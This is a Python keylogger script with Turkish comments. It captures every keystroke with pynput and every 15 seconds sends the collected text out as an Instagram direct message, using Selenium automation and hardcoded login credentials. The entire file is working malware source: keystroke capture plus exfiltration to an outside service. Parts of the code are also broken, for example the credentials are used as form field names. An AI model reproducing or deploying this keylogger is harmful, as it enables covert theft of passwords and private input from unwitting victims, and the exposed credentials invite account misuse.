import pynput.keyboard
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_binary import FirefoxBinary
import threading

toplama = "Keylogger Baslatiliyor..."
toplama = ""

def emir(harfler):
    global toplama
    try:
        toplama += harfler.char
    except AttributeError:
        if harfler == pynput.keyboard.Key.space:
            toplama += " "
        elif harfler == pynput.keyboard.Key.backspace:
            if len(toplama) > 0:
                toplama = toplama[:-1]  # Geri alma işlemi
        elif harfler == pynput.keyboard.Key.enter:
            toplama += "\n"
        else:
            toplama += str(harfler)
    print(toplama)

def instagram_mesaj_gonder(mesaj):
    binary = FirefoxBinary("/home/kali/Desktop/geckodriver.exe")
    driver = webdriver.Firefox(firefox_binary=binary)

    # Instagram'a oturum aç
    driver.get("https://www.instagram.com/")
    time.sleep(5)  # Yüklenmesini bekleyin

    # Giriş yapın
    kullanici_giris = driver.find_element_by_name("01hackmack")
    sifre_giris = driver.find_element_by_name("253659Qq")
    kullanici_giris.send_keys("01hackmack")
    sifre_giris.send_keys("253659Qq")
    sifre_giris.send_keys(Keys.RETURN)
    time.sleep(5)  # Giriş yapılmasını bekleyin

    # Mesaj gönderme
    driver.get("https://www.instagram.com/direct/inbox/")
    time.sleep(5)  # Yüklenmesini bekleyin
    driver.find_element_by_xpath('//button[contains(text(),"Not Now")]').click()  # Bildirimleri kapat
    driver.find_element_by_xpath('//button[text()="Send Message"]').click()  # Mesaj gönderme düğmesine tıkla
    driver.find_element_by_xpath('//input[@name="queryBox"]').send_keys("RecipientUsername")  # Alıcıyı girin
    time.sleep(2)  # Alıcıyı seçmesini bekleyin
    driver.find_element_by_xpath('//button[text()="Next"]').click()  # Sonraki adıma geçin
    time.sleep(2)  # Yükleme için bekleyin
    mesaj_alanı = driver.find_element_by_tag_name("textarea")  # Mesaj alanını bulun
    mesaj_alanı.send_keys(mesaj + Keys.RETURN)  # Mesajı girin ve göndermek için ENTER tuşuna basın

    # Mesaj gönderildiğinde birkaç saniye bekleyin ve sonra sürücüyü kapatın
    time.sleep(5)
    driver.quit()

def dallanma():
    global toplama
    if toplama:
        instagram_mesaj_gonder(toplama)
        toplama = ""
    timer = threading.Timer(15, dallanma)
    timer.start()

dinleme = pynput.keyboard.Listener(on_press=emir)

with dinleme:
    dallanma()
    dinleme.join()
